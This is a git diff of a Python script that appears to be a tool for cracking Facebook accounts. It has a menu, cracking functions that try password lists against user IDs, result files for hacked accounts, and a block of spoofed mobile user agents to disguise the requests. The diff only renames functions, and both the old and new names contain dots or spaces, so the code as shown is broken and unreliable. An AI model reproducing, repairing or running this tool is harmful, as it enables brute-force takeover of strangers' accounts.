@@ -45,7 +45,7 @@ logo = """
 __________________________________
   OWNER     :   ZAKARYIA KHAN 
   GITHUB    :   Github.com/ZMuKhLiS352 
-  Facebook  :   Z.MUKHLIS  
+  Facebook  :   MUKHLIS   
   TOOL      :   RANDOM 
 __________________________________\033[1;32m"""
 loop = 0
@@ -60,22 +60,22 @@ def main():
 	print(" \x1b[1;97m[3] \x1b[1;97mJoin Whatsapp group   ")
 	print(" \x1b[1;98m[0] \x1b[1;92mExit")
 	print(47*'\033[92;1m-')
-	Z.MUKHLIS _select()
+	MUKHLIS  _select()
 
-def Z.MUKHLIS _select():
-	Z.MUKHLIS  = input('\n\x1b[1;93m[+] Choose Option: \x1b[1;92m')
-	if Z.MUKHLIS  == '':
+def MUKHLIS  _select():
+	MUKHLIS   = input('\n\x1b[1;93m[+] Choose Option: \x1b[1;92m')
+	if MUKHLIS   == '':
 		print("\x1b[1;91mFill in correctly")
 		main()
-	elif Z.MUKHLIS  == '1':
-		Z.MUKHLIS _TRICKER()
-	elif Z.MUKHLIS  == '2':
+	elif MUKHLIS   == '1':
+		MUKHLIS  _TRICKER()
+	elif MUKHLIS   == '2':
 		os.system('xdg-open https://www.facebook.com/Raja.zakaryia')
 		main()
-	elif Z.MUKHLIS  == '3':
+	elif MUKHLIS   == '3':
 		os.system('xdg-open https://chat.whatsapp.com/Cntlb8VXTIi6Hntmk7sODi')
 		main()
-	elif Z.MUKHLIS  == '0':
+	elif MUKHLIS   == '0':
 		os.system('exit')
 	else:
 		print ('\x1b[1;91m[!] Please select a valid option')
@@ -83,7 +83,7 @@ def Z.MUKHLIS _select():
 		main()
 
    
-def Z.MUKHLIS _TRICKER():
+def MUKHLIS  _TRICKER():
 	os.system('clear')
 	print(logo)
 	os.system('xdg-open https://www.facebook.com/Raja.zakaryia')
@@ -98,7 +98,7 @@ def Z.MUKHLIS _TRICKER():
 		main()
 	else:
 		print('\n\033[1;31mChoose valid option\033[0;97m')
-		Z.MUKHLIS _KING()
+		MUKHLIS  _KING()
 		
 def method():
 	os.system('clear')
@@ -115,7 +115,7 @@ def method():
 	elif opt =='2':
 		method2()
 	elif opt =='0':
-		Z.MUKHLIS _KING()
+		MUKHLIS  _KING()
 	else:
 		print('\n\033[1;31mChoose valid option\033[0;97m')
 		method()
@@ -154,7 +154,7 @@ def method1():
 	print('Ids saved in ok.txt,cp.txt')
 	print(54*'_')
 	input('\033[1;32m Press enter to back ')
-	Z.MUKHLIS _TRICKER()
+	MUKHLIS  _TRICKER()
 	
 def mcrack(uid,pwx,tl):
 	#print(user)
@@ -260,14 +260,14 @@ def method2():
 	print('Ids saved in ok.txt,cp.txt')
 	print(54*'_')
 	input('\033[1;32m Press enter to back ')
-	Z.MUKHLIS _TRICKER()
+	MUKHLIS  _TRICKER()
 	
 def mbcrack(uid,pwx,tl):
 	#print(user)
 	global loop
 	global cp
 	global ok
-	global Z.MUKHLIS 
+	global MUKHLIS  
 	try:
 		for ps in pwx:
 			agents =['Mozilla/5.0 (Linux; Android 11; SM-M107F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 GSA/13.14.9.23.arm64Mozilla/5.0 (Linux; Android 11; SM-M107F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 GSA/12.18.11.23.arm64Mozilla/5.0 (Linux; Android 13; SM-M236B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.61 Mobile Safari/537.36 OPX/2.0Mozilla/5.0 (Linux; Android 13; SM-M236B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]Mozilla/5.0 (Linux; Android 13; SM-M236B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/416.0.0.35.85;]Mozilla/5.0 (Linux; Android 13; SM-M236B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/417.0.0.33.65;]Mozilla/5.0 (Linux; Android 12; SM-M236B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]Mozilla/5.0 (Linux; Android 12; SM-M236B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 13; SM-M236B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]Mozilla/5.0 (Linux; Android 12; SM-M236B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]Mozilla/5.0 (Linux; Android 13; SM-M236B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]Mozilla/5.0 (Linux; Android 12; SM-M236B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]Mozilla/5.0 (Linux; Android 13; SM-M236B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.163 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]Mozilla/5.0 (Linux; Android 12; SM-M236B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-M236B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 11; ACTAB1022) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Safari/537.36Mozilla/5.0 (Linux; Android 11; BV6600Pro) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 13; 23013PC75G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 12; S98) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 13; RMX3371) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 11; WP15) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 11; Live 9) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 13; TECNO CK7n) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 12; V Max) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 13; SC-51B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36']
